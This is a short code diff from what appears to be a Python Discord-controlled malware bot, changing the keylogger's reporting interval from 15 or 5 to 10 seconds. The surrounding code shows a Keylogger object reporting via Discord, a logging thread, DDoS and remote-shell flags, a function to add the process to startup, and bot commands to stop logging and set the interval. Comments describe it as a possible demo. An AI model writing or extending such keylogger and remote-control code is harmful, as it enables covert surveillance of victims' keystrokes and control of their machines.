@@ -30,9 +30,8 @@ activated = False
 closeDDOS = True
 closeLogger = True
 controllerVersion = "V1.1"
-keyListener = Keylogger(15, 'discord', botID) #creating keylogger object to hold reference too
+keyListener = Keylogger(10, 'discord', botID) #creating keylogger object to hold reference too
 loggerThread = threading.Thread(target=keyListener.mainLoop, args=()).start() #need reference to logging thread so it doesnt keep making more. not doing this for socket since i could want more than one shell at a time.
-
 #May not implement this in the end as there is no reasonable reason to do this for demo purposes.
 #Might do it anyways because it'd be cool.
 def addProcToStartup():
@@ -114,7 +113,7 @@ async def stoplog(ctx):
         await ctx.send(f"{botID} has stopped listening...")
 
 @bot.command("setint")
-async def setint(ctx, interval = 5):
+async def setint(ctx, interval=10):
     global activated
     if activated:
         keyListener.changeInterval(int(interval))
